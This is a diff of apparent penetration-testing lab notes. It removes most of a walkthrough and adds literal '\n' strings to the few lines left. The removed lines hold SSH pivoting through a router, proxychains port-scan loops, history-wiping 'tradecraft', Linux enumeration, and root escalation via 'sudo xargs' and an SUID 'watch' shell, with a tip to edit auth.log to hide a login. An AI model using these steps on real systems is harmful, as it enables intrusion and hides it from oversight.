@@ -1,9 +1,9 @@
-Objective: Gain root access to the websrver within the 172.16.28.0/24 network
+Objective: Gain root access to the websrver within the 172.16.28.0/24 network \n
 
-SoM:
+SoM:	\n
 Linux_Ops Station
 -> P1: 10.50.25.213 adeptus:mechanicus OS:VYOS
---> T1: 172.16.28.?/24
+--> T1: 172.16.28.?/24 \n
 
 creds:
 adeptus:mechanicus ??
@@ -16,98 +16,4 @@ nc -zvnw1 10.50.25.213 22	see if port 22 is up
 nc -vnw1 10.50.25.213 22	bannergrab
 
 Results: 
-10.50.25.213 Open on 22 SSH-2.0-OpenSSh
-
-ssh adeptus@10.50.25.213		- works, vyos router
-ssh adeptus@10.50.25.213 -D 9050 -NT
-
-do ping scan on the pivot box (won't work here cauase its a vyos router)
-for i in $(seq 1 254); do (ping -c 1 192.168.150.$i | grep "bytes from" &); done
-
-
-do port scan (use the scan.sh nc scan script)
-	proxychains ./scan.sh
-	for x in {30,65,66,67,90,120,129,130,131,150,190,193,194,195}; do for i in {22,80,443,3389}; do (proxychains /bin/nc -zvnw1 172.16.28.$x $i 2>&1 | grep "succeeded!"); done; done
-	
-Bannergrab the ports you find
-	proxychains nc <ip addr> port 
-	
-	
-Once you know what application it is, you can start to figure out how to exploit
-	
-
-
-##tradecraft##
-set +o history 		(wont save history for this user for this session)
-export HISTIGNORE="ls*;cat*"	(running any version of ls or cat won't save to history)
-export HISTFILESIZE=10		(history file size becomes only 10 lines)
-unset HISTFILE			(removes the file that histroy would be saved to)
-history -c 			(clears history)
-	
-	
-##Users##
-w		(shows what users are logged in doing stuff)
-whoami
-ls -Rlisa /home
-cat /etc/passwd	| grep /bin/bash (see who has bin/bash shells)
-
-##Processes##
-ps -elf
-cat /etc/rsyslog.conf
-
-facility.severity {action}
-auth,authpriv.*			/var/log/auth.log
-
-lsof
-clear
-
-##Services##
-systemctl list-units --type service		(shows the services on machine)
-
-##Network Connections Open&Actice ##
-netstat -antp
-ss -a
-cat /etc/hosts
-	holds all the names for machines that the box knows
-	("localhost", "webserver", ect)
-	this is set by hand typically, so if something is there it 
-	most likely exists and can be reached
-	
------
-
-#Potential Priv Escalation Actions#
-sudo -l 	(see frank can do stuff as gloken
-find / -type f -perm /4000 -ls 2>/dev/null
-
-
-Linux Permissions
-UGO - User, Group, Other
-
-Read, Write, Execute
-U		G		O 
-rwx    rwx     rwx 
-421    421     421
-
-sudo -u gloken cat .passwords
-
-log in as gloken su gloken
-sudo -l 
-sudo xargs -a /dev/null sh
-
-there ya go, you root
-cat /var/log/auth.log | tail -n 20
-
-	SHOULD edit this log file to not show you logging in
-
-ANOTHER WAY to get in
-searing for what is run by root (suid for root)
-find / -type f -perm /4000 -ls 2>/dev/null
-
-see that it is running watch as root. see on gtfo bins a vuln
-watch -x sh -c 'reset; exec sh 1>&0 2>&0'
-
-WORKING WITH SUID
-
-chmod +s /usr/bin/watch 	changes suid permissions run as owner of executable
-/usr/bin/watch -x sh -c 'reset; exec sh 1>&0 2>&0'
-
+10.50.25.213 Open on 22 SSH-2.0-OpenSSh \n
